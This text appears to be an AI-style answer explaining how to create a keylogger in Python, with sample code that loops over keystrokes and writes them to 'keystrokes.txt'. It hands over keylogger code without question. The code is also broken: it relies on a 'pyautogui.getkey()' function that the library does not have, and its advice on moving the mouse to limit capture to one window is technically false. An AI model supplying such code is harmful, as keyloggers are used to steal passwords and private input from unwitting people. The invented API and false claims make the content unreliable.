To create a keylogger, you can use the `pyautogui` library in Python. Here's some sample code to get you started:
```python
import pyautogui
import time

keystrokes = []

while True:
    keystroke = pyautogui.getkey()
    if keystroke != 'q':
        keystrokes.append(keystroke)
    if keystroke == 'q':
        break

with open('keystrokes.txt', 'w') as f:
    for keystroke in keystrokes:
        f.write(keystroke + '\n')
```
This code will continuously record keystrokes and store them in a list. If the user presses the 'q' key, the loop will exit and the keystrokes will be saved to a file called "keystrokes.txt".

It's important to note that this code will record keystrokes for the entire program, not just the terminal window. If you want to only record keystrokes for a specific window, you can use the `pyautogui.locateOnScreen()` method to locate the window and `pyautogui.moveTo()` method to move the mouse to that window before starting the loop.

